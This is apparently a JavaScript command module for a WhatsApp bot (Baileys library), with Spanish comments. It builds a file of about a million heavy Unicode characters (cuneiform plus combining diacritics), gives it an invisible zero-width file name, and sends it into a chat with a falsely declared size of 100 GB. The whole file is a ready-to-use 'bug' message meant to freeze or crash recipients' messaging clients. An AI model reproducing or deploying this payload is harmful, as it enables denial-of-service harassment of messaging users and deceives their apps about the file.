/* * 👑 Bug Download Generator - Misa-Bot
 * Genera un archivo con peso falso de 100GB y 400k Unicodes.
 * Autor: Yanniel & Gemini
 */

const bugCommand = {
    name: 'unicode',
    alias: ['heavy', 'bug'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args }) => {
        const chat = m.key.remoteJid

        try {
            // 1. Generar la carga de 1,000000 Unicodes densos
            let cantidad = 1000000
            let carga = ""
            for (let i = 0; i < cantidad; i++) {
                // Mezcla de Cuneiforme y diacríticos pesados
                carga += String.fromCodePoint(0x12000 + (i % 800))
                carga += String.fromCodePoint(0x0345) 
            }

            const buffer = Buffer.from(carga, 'utf-8')

            // 2. Nombre invisible
            const nombreInvisible = String.fromCodePoint(0x200C, 0x200C, 0x200C) + ".txt"

            // 3. Enviar el archivo con el "Bug" de tamaño
            await conn.sendMessage(chat, {
                document: buffer,
                mimetype: 'text/plain',
                fileName: nombreInvisible,
                // Aquí ocurre el truco: le decimos a Baileys que el tamaño es 100GB
                fileLength: 107374182400, // 100 GB en bytes
                caption: null // No enviamos texto, solo el archivo
            }, { quoted: m })

        } catch (err) {
            console.error('Error en Bug Download:', err)
        }
    }
}

export default bugCommand
